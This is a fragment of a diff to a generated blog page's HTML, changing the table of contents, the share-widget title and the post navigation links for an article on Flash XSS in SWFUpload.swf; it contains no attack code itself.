+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-SWFUpload简介"><span class="toc-number">1.</span> <span class="toc-text">0x01 SWFUpload简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Flash-XSS"><span class="toc-number">2.</span> <span class="toc-text">0x02 Flash XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考"><span class="toc-number">3.</span> <span class="toc-text">0x03 参考</span></a></li></ol>
         
     </div>
     <style>
@@ -454,7 +397,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Teaser CONFidence CTF Web writeup　| Mi1k7ea　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"SWFUpload.swf的Flash型XSS分析　| Mi1k7ea　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -474,15 +417,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/03/22/图片XSS小结/" title="上一篇: 图片XSS小结">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/03/17/SpEL注入之javacon/" title="下一篇: SpEL注入之javacon">
+            <a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/" title="下一篇: ZeroClipboard.swf的Flash型XSS分析">
                 <i class="fa fa-angle-right"></i>
             </a>
         
